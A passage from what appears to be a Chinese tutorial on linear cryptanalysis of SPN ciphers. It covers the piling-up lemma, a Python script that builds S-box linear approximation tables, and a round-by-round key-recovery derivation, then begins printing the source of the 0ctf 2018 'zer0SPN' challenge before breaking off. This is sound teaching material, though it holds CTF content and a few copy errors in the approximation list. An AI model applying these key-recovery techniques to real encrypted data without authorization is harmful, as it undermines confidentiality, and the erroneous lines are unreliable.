<p>能够使用线性分析法的环境：线性分析可行一般取决于S盒设计，如果S盒导致出现多个线性表达式成立的概率距离1/2很远，那么最终分析结果将会越好；其次就是密钥长度不要太长，轮次不能太多，否则分析难度将会急剧增加。</p>
<h4 id="2-1-Piling-Up-Principle（叠加原理）"><a href="#2-1-Piling-Up-Principle（叠加原理）" class="headerlink" title="2.1 Piling-Up Principle（叠加原理）"></a>2.1 Piling-Up Principle（叠加原理）</h4><p>$$<br>\begin{equation}<br>P_r(X_1=i)=\left [<br>             \begin{array}{lr}<br>              p_1, i=0 \newline<br>             1-p_1, i=1 \newline<br>             \end{array}<br>\right]\<br>\end{equation}<br>$$</p>
<p>而<br>$$<br>P_r(X_2=i)=\left [<br>             \begin{array} {lr}<br>              p_2, i=0 \newline<br>             1-p_2, i=1 \newline<br>             \end{array}<br>\right]<br>$$</p>
<p>于是有：<br>$$<br>P_r(X_1 \oplus X_2) = P_r(X_1=X_2)=p_1 p_2 + (1-p_1)(1-p_2)<br>$$<br>令 $p_1=1/2+\epsilon_1$， $p_2=1/2+\epsilon_2$</p>
<p>则有 $P_r(X_1 \oplus X_2 = 0)=1/2+2\epsilon_1 \epsilon_2$</p>
<p>我们可以简写 $\epsilon_{1,2} = 2\epsilon_1 \epsilon_2$</p>
<p>根据Piling-Up Lemma (Matsui) ，我们可以快速得到：</p>
<p>$P_r(X_1 \oplus ... \oplus X_n = 0) = 1/2 + 2^{n-1} \prod_{i=1} ^n \epsilon_i$</p>
<p>如果其中某一个$p_i=1/2$， 那么最终的 $P_r(X_1 \oplus ... \oplus X_n = 0) = 1/2$</p>
<p>假设 $X_1 \oplus X_2$ 与 $X_2 \oplus X_3$ 是相互独立的，那么我么有：</p>
<p>$P_r(X_1 \oplus X_3 = 0) = 1/2 +2\epsilon_{1,2} \epsilon_{2,3}$</p>
<p>所以在这种情况下有 $\epsilon_{1,3} = 2\epsilon_{1,2} \epsilon_{2,3}$</p>
<h4 id="2-2-分析S盒"><a href="#2-2-分析S盒" class="headerlink" title="2.2 分析S盒"></a>2.2 分析S盒</h4><p>假设S盒输入四位，输出四位，如下图所示：</p>
<p><img src="\images\2018-04-03\2.png" alt="S盒"></p>
<p>假设现在使用的查看的是$X_2 \oplus X_3 \oplus =Y_1 \oplus Y_3 \oplus Y_4$</p>
<p>我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有12个符合上面的等式。所以上式发生的概率偏差为 $12/16-1/2=1/4$</p>
<p>假设现在使用的查看的是$X_1 \oplus X_4 \oplus =Y_2$</p>
<p>我们首先输入16个可能的输入作为X，然后检查对应的可能输出作为Y。我们发现这16个中有8个符合上面的等式。所以上式发生的概率偏差为 $8/16-1/2=0$</p>
<p><img src="\images\2018-04-03\3.png" alt="近似值"></p>
<p>上述讲述了通常意义上的方法，那么我们如何运用算法来求解呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line"></div><div class="line"># sbox from the tutorial</div><div class="line">sbox = [0xe, 4, 0xd, 1, 2, 0xf, 0xb, 8, 3, 0xa, 6, 0xc, 5, 9, 0, 7]</div><div class="line">#sbox = [0xf, 3, 0xa, 6, 4, 1, 0xb, 9, 0xe, 5, 0, 0xd, 2, 0xc, 7, 8]</div><div class="line">SIZE_SBOX = len(sbox)</div><div class="line">linear_approx_table = [0]*SIZE_SBOX*SIZE_SBOX</div><div class="line"></div><div class="line"># compute the linear approximation for a given &quot;input = output&quot; equation</div><div class="line">def linearApprox(input_int, output_int):</div><div class="line">    total = 0</div><div class="line">    # range over the input</div><div class="line">    for ii in range(SIZE_SBOX):</div><div class="line">        # get input and output of our equations</div><div class="line">        input_masked = ii &amp; input_int</div><div class="line">        output_masked = sbox[ii] &amp; output_int</div><div class="line">        # same result?</div><div class="line">        if (bin(input_masked).count(&quot;1&quot;) - bin(output_masked).count(&quot;1&quot;)) % 2 == 0:</div><div class="line">            total += 1</div><div class="line">    # get the number of results compared to 8/16</div><div class="line">    result = total - (SIZE_SBOX//2)</div><div class="line">    if result &gt; 0:</div><div class="line">        result = &quot;+&quot; + str(result)</div><div class="line">    else:</div><div class="line">        result = str(result)</div><div class="line"></div><div class="line">    return result</div><div class="line"></div><div class="line">def main():</div><div class="line">    # rows</div><div class="line"></div><div class="line">    sys.stdout.write( &quot;     | &quot;)</div><div class="line">    for i in range(SIZE_SBOX):</div><div class="line">        sys.stdout.write(str(i).rjust(4) + &quot; &quot;)</div><div class="line">    print &quot;&quot;</div><div class="line">    print &quot; &quot; + &quot;-&quot; * (SIZE_SBOX * 5 + 5)</div><div class="line">    for row in range(SIZE_SBOX):</div><div class="line">        sys.stdout.write(str(row).rjust(4) +  &quot; | &quot;)</div><div class="line">        # cols</div><div class="line">        for col in range(SIZE_SBOX):</div><div class="line">            # print the linear approx</div><div class="line">            r = linearApprox(row,col)</div><div class="line">            sys.stdout.write(r.rjust(4) + &quot; &quot;)</div><div class="line">            linear_approx_table[row*SIZE_SBOX+col]=(int(r))</div><div class="line">        print &quot;&quot;</div><div class="line">    print linear_approx_table</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>根据上述算法，我们得到下面这张表linear Approximation Table：</p>
<p><img src="\images\2018-04-03\4.png" alt=""></p>
<p>我们来讲一讲这张表的含义：</p>
<p><strong>Input sum代表的是所有比特位的累加和，output sum表示所有比特位的累加和。而在表中的数字代表的是：输入和的2进制表达式对应的输入与输出和的2进制表达式对应的输出组成的线性表达式，其成立的次数减去所有可能数的一半。</strong></p>
<p>例如：$X_2 \oplus X_3 \oplus =Y_1 \oplus Y_3 \oplus Y_4$ 对应的就是$(2^2+2^1,2^3+2+2^0)=(6,11)=+4$，概率偏差就是1/4</p>
<p>$X_1 \oplus X_4 \oplus =Y_2$ 对应的就是$(2^3+1,2^2)=(9,4)=0$  其概率偏差为0</p>
<p>几个常用的引理：</p>
<blockquote>
<ol>
<li>任何输出位的线性组合，在遍历ii，求得sbox[ii] &amp; output_sum后，必定具有相同数量的0和1</li>
<li>所有无输出比特的线性组合与所有无输入的线性组合相等，都是1/2，即左上角（0,0）是sbox_size/2，而(0,i)=(i,0)=0， 其中i不为0。</li>
<li>所有行和的绝对值为sbox_size/2，所有列和的绝对值为sbox_size/2。</li>
</ol>
</blockquote>
<h4 id="2-3-引理的证明"><a href="#2-3-引理的证明" class="headerlink" title="2.3 引理的证明"></a>2.3 引理的证明</h4><p>根据算法，我们可以写出下列表达式</p>
<p>我们首先看一下input_sum确定的情况：<br>$$<br>\sum_{j=0} ^n \sum_{i=0} ^n P(output_{mask},input_{mask})=\sum_{j=0} ^n \sum_{i=0} ^n P(i \&amp; input_{sum}, sbox[i] \&amp; j)<br>= \sum_{i=0} ^n \sum_{j=0} ^n P(i \&amp; input_{sum}, sbox[i] \&amp; j) =  \sum_{sbox[i]=0}  P(i \&amp; input_{sum}, sbox[i] \&amp; j)  =  -sbox_{size}/2 或者 +sbox_{size}/2<br>$$</p>
<h3 id="0x03-线性分析法整体分析"><a href="#0x03-线性分析法整体分析" class="headerlink" title="0x03 线性分析法整体分析"></a>0x03 线性分析法整体分析</h3><h4 id="3-1-具体步骤"><a href="#3-1-具体步骤" class="headerlink" title="3.1 具体步骤"></a>3.1 具体步骤</h4><p>根据上面那种线性分析表格，我们有：</p>
<p>$S_{12}: X_1 \oplus X_3 \oplus X_4 = Y_2;  概率12/16, 偏差1/4$</p>
<p>$S_{22}: X_2= Y_2 \oplus Y_4;  概率4/16, 偏差-1/4$</p>
<p>$S_{32}: X_2= Y_2 \oplus Y_4;  概率4/16, 偏差-1/4$</p>
<p>$S_{34}: X_2= Y_2 \oplus Y_4;  概率416, 偏差-1/4$</p>
<p>设 $U_{i,j}(V_{i,j})$ 表示第i轮的16比特中的第j比特输入或输出，$P_i$ 代表16位明文的第i位输入</p>
<p><img src="\images\2018-04-03\5.png" alt=""></p>
<p>于是我们有：</p>
<p>第一轮： $V_{1,6} = U_{1,5} \oplus U_{1,7} \oplus U_{1,8} = (P_5 \oplus K_{1,5}) \oplus (P_7 \oplus K_{1,7}) \oplus (P_8 \oplus K_{1,8})$    (2)</p>
<p>第二轮：$V_{2,6} \oplus V_{2,8} = U_{2,6} = V_{1,6} \oplus K_{2,6}$</p>
<p>带入第一轮的数据，有：$V_{2,6} \oplus V_{2,8} \oplus P_5 \oplus P_7 \oplus P_8 \oplus K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8} \oplus K_{2,6} =0 $  (3)</p>
<p>(2)式的概率偏差是1/4，概率为3/4，带入(3)式有其概率为： 1/2+2(3/4-1/2)(1/4-1/2)=3/8  (偏差-1/8)</p>
<p>第三轮：$V_{3,6} \oplus V_{3,8} = U_{3,6} = V_{2,6} \oplus K_{3,6}$</p>
<p>$V_{3,14} \oplus V_{3,16} = U_{3,14} = V_{2,8} \oplus K_{3,14}$</p>
<p>带入之后有： $V_{3,6} \oplus V_{3,8} \oplus V_{3,14} \oplus V_{3,16} \oplus V_{2,6} \oplus K_{3,6} \oplus V_{2,8} \oplus K_{3,14} = 0$   (4)</p>
<p>(4)式的概率为 1/2+2(1/4-1/2)(1/4-1/2) = 5/8 (偏差为1/8)</p>
<p>结合(3)、(4)式，我们有： $V_{3,6} \oplus V_{3,8} \oplus V_{3,14} \oplus V_{3,16} \oplus P_5 \oplus P_7 \oplus P_8 \oplus K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8}  \oplus K_{2,6} \oplus  K_{3,6} \oplus K_{3,14} = 0$ </p>
<p>第四轮：由$U_{4,6} = V_{3,6} \oplus K_{4,6}$，$U_{4,8} = V_{3,14} \oplus K_{4,8}$， $U_{4,14}=V_{3,8} \oplus K_{4,14}$ ，$U_{4,16} = V_{3,16} \oplus K_{4,16}$</p>
<p>我们有：$U_{4,6} \oplus U_{4,8} \oplus U_{4,14} \oplus U_{4,16} \oplus  P_5 \oplus P_7 \oplus P_8 \oplus \sum_K = 0$ </p>
<p>其中：$\sum_K = K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8} \oplus K_{2,6} \oplus  K_{3,6} \oplus K_{3,14} \oplus K_{4,6}  \oplus K_{4,8}  \oplus K_{4,14} \oplus K_{4,16}$</p>
<p>其中$\sum_K$ 的值为0或1，并且由叠加原理，有其概率为 $1/2+2^3(3/4-1/2)(1/4-1/2)^3=15/32$  （偏差-1/32）</p>
<p>$U_{4,6} \oplus U_{4,8} \oplus U_{4,14} \oplus U_{4,16} \oplus  P_5 \oplus P_7 \oplus P_8 = 0$     （5）</p>
<p>第5轮：</p>
<h4 id="3-2-获取Key的各比特位的值"><a href="#3-2-获取Key的各比特位的值" class="headerlink" title="3.2 获取Key的各比特位的值"></a>3.2 获取Key的各比特位的值</h4><p>上面之所以不进行第5轮的计算，是因为若R-1轮线性分析后，从密文反推会更为容易。</p>
<p>对于给出对应位置的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$，解密出对应的密文得到$[V_{4,5} ... V_{4,8}, V_{4,13} ... V_{4,16}]$。通过S和的逆变换，我们可以求解出$[U_{4,5} ... U_{4,8}, U_{4,13} ... U_{4,16}]$ 。然后依据（5）式，可以算出符合该线性表达式的次数。</p>
<p>之所以可以使用这种方法，是因为如果部分目标子密钥正确，那么（5）式成立的概率将会与1/2有很大不同。而其他不正确的子密钥，将会造成（5）式概率接近于1/2。</p>
<p>(5)式影响S盒$S_{42}$ 和 $S_{44}$ 的输入。对于每对明密文对，我们将会尝试256种可能的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$ 。对于每种可能的部分子密钥，我们都会求出(5)式为真时的次数。这些次数偏离最远的就是正确的解，当然不用管这些次数是正向偏移还是逆向偏移（其取决于$\sum_K$）。</p>
<p>当$\sum_K=0$ 时，（5）式成立的概率 &lt; 1/2</p>
<p>当$\sum_K=1$ 时，（5）式成立的概率 &gt; 1/2</p>
<p>我们测试了10000组已知明密文对，用下列公式计算偏移：</p>
<p>$|bias| = |count - 5000|/10000$</p>
<p>最终得到下面的表格：</p>
<p><img src="\images\2018-04-03\6.png" alt=""></p>
<p>根据表格可以看出$[K_{5,5} ... K_{5,8}]=0010, [K_{5,13} ... K_{5,16}]=0100$ 时，偏移概率最大，为0.0336。其实1/32=0.03125。注意到这些之后，我们可以肯定这两部分的密钥值就是这些。</p>
<p>而直到这两部分的值之后，我们完全可以爆破求解另外两部分的密钥（如果密钥是可以反向求解的！）</p>
<h4 id="3-3-攻击的复杂度"><a href="#3-3-攻击的复杂度" class="headerlink" title="3.3 攻击的复杂度"></a>3.3 攻击的复杂度</h4><p>成功原因：如果S盒偏差越大，线性分析的偏差也会越大。</p>
<p>设$\epsilon$ 为线性表达式距离1/2的偏差，Matsui表示要使攻击成功，那么已知明文的数量要与$\epsilon^-2$ 的数量成正比。</p>
<p>如果$N_L$ 表示线性表达式需要的已知明文数量，则有 $N_L \approx 1/\epsilon^2$</p>
<p>由于偏差使用线性叠加的方式来计算的，所以很容易看出偏差依赖于S盒的线性近似表达式和触发的S盒数量。</p>
<h3 id="0x04-范例"><a href="#0x04-范例" class="headerlink" title="0x04 范例"></a>0x04 范例</h3><p>既然讲到了线性分析法，那么我们就必须使用其进行解题。下面是2018 0ctf的一道题，zer0SPN</p>
<p>zer0SPN.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="comment">#from secret import secret</span></div><div class="line"></div><div class="line">rcon = [<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>]</div><div class="line">sbox = [<span class="number">62</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">20</span>, <span class="number">210</span>, <span class="number">41</span>, <span class="number">66</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">152</span>, <span class="number">143</span>, <span class="number">75</span>, <span class="number">105</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">175</span>, <span class="number">191</span>, <span class="number">166</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">190</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">225</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">252</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">86</span>, <span class="number">235</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">197</span>, <span class="number">154</span>, <span class="number">176</span>, <span class="number">199</span>, <span class="number">253</span>, <span class="number">69</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">184</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">104</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">160</span>, <span class="number">169</span>, <span class="number">82</span>, <span class="number">148</span>, <span class="number">73</span>, <span class="number">30</span>, <span class="number">229</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">137</span>, <span class="number">157</span>, <span class="number">180</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">165</span>, <span class="number">9</span>, <span class="number">162</span>, <span class="number">233</span>, <span class="number">18</span>, <span class="number">85</span>, <span class="number">217</span>, <span class="number">84</span>, <span class="number">7</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">171</span>, <span class="number">56</span>, <span class="number">118</span>, <span class="number">237</span>, <span class="number">132</span>, <span class="number">136</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">205</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">14</span>, <span class="number">122</span>, <span class="number">47</span>, <span class="number">71</span>, <span class="number">201</span>, <span class="number">99</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">74</span>, <span class="number">173</span>, <span class="number">76</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">155</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">96</span>, <span class="number">44</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">215</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">159</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">198</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">170</span>, <span class="number">131</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">29</span>, <span class="number">230</span>, <span class="number">32</span>, <span class="number">187</span>, <span class="number">125</span>, <span class="number">134</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">164</span>, <span class="number">247</span>, <span class="number">25</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">67</span>, <span class="number">147</span>, <span class="number">146</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">243</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">239</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">70</span>, <span class="number">203</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">113</span>, <span class="number">8</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">240</span>, <span class="number">21</span>, <span class="number">93</span>, <span class="number">142</span>, <span class="number">238</span>, <span class="number">167</span>, <span class="number">5</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">145</span>, <span class="number">188</span>, <span class="number">172</span>, <span class="number">224</span>, <span class="number">226</span>, <span class="number">207</span>, <span class="number">27</span>, <span class="number">218</span>, <span class="number">48</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">4</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">196</span>, <span class="number">141</span>, <span class="number">208</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">213</span>, <span class="number">216</span>, <span class="number">232</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">212</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">129</span>, <span class="number">227</span>, <span class="number">249</span>, <span class="number">127</span>, <span class="number">149</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">31</span>, <span class="number">153</span>, <span class="number">250</span>, <span class="number">156</span>, <span class="number">168</span>, <span class="number">110</span>]</div><div class="line">ptable = [</div><div class="line">    <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">56</span>,</div><div class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">57</span>,</div><div class="line">    <span class="number">2</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">58</span>,</div><div class="line">    <span class="number">3</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">59</span>,</div><div class="line">    <span class="number">4</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">44</span>, <span class="number">52</span>, <span class="number">60</span>,</div><div class="line">    <span class="number">5</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">61</span>,</div><div class="line">    <span class="number">6</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">62</span>,</div><div class="line">    <span class="number">7</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">63</span></div><div class="line">]</div><div class="line">sbox_inv = [<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, 